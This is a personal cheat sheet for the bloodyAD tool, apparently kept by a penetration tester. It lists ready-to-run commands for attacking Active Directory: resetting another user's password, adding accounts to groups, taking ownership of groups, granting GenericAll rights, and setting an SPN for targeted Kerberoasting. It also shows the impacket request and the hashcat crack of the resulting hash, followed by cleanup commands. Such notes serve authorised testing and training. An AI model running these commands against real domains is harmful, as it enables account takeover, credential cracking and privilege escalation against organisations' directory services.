---
icon: lucide/scroll-text
---

# bloodyAD

> Github: https://github.com/CravateRouge/bloodyAD/  
> User guide: https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

The user guide for bloodyAD is actually really good. It's just that it's really long, so I want to note down a few of the most common use cases so I can easily refer back to them.

``` text
# Set password for a user
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC01 set password target_user 'New_p@ssword1'

# Add user to a group
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC01 add groupMember TARGET_GROUP target_user

# Set SPN for targeted kerberoasting
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC01 set object target_user servicePrincipalName -v 'cifs/fakehost'

# Use impacket to kerberoast user
impacket-GetUserSPNs -request -dc-ip DC01 DOMAIN.LOCAL/username:'Password' -outputfile username.hash
hashcat -m 13100 username.hash /usr/share/wordlists/rockyou.txt

# Make user the owner of a group
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC01 set owner TARGET_GROUP target_user

# Give genericAll over a group
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC01 add genericAll TARGET_GROUP target_user
```

Also useful to have some clean up commands. Not that using "set" and not giving a value (-v) is the same as unsetting

``` text
# Remove a user from a group
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC0q remove groupMember TARGET_GROUP target_user

# Remove SPN after targeted kerberoast
bloodyAD -d DOMAIN.LOCAL -u username -p Password --host DC01 set object target_user servicePrincipalName

# Remove genericAll from an object
bloodyAD -d DOMAIN.LOCAL -u username -p 'Password' --host DC01 remove genericAll TARGET_GROUP target_user
```
